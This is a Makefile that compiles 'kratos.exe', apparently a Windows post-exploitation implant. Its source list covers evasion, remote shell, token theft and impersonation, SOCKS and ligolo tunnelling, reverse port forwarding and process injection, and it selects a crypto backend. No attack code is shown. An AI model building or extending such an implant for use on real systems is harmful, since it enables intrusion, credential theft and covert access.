SRC = main.c Checkin.c utils.c crypto.c evasion.c \
      command_shell.c command_run.c command_getuid.c \
      command_pwd.c command_cd.c command_ls.c \
      command_sleep.c command_exit.c \
      command_cat.c command_cp.c command_mv.c \
      command_rm.c command_mkdir.c command_ps.c \
      command_kill.c command_whoami.c command_ifconfig.c \
      command_download.c command_upload.c \
      command_steal_token.c command_make_token.c command_runas.c command_rev2self.c \
      command_socks.c socks.c command_rportfwd.c \
      command_ligolo.c \
      command_spawn.c \
      inject.c

# Crypto backend: USE_BCRYPT (default) or USE_TINY_AES
# Set via CFLAGS=-DUSE_TINY_AES by builder.py
ifneq (,$(findstring USE_TINY_AES,$(CFLAGS)))
    SRC += aes.c sha256.c
    LIBS = -lwinhttp -ladvapi32 -lws2_32
    # CRITICAL: propagate AES256 to ALL .c files (aes.c compiles independently)
    # Without this, aes.c = AES-128 but crypto.c expects AES-256 -> corrupted AES_ctx
    AES_DEFINES = -DAES256=1 -DCBC=1 -DECB=0 -DCTR=0
else
    LIBS = -lwinhttp -lbcrypt -ladvapi32 -lws2_32
    AES_DEFINES =
endif

kratos: $(SRC)
	$(CC) $(CFLAGS) $(AES_DEFINES) -o kratos.exe $(SRC) $(LIBS)

clean:
	rm -f kratos.exe
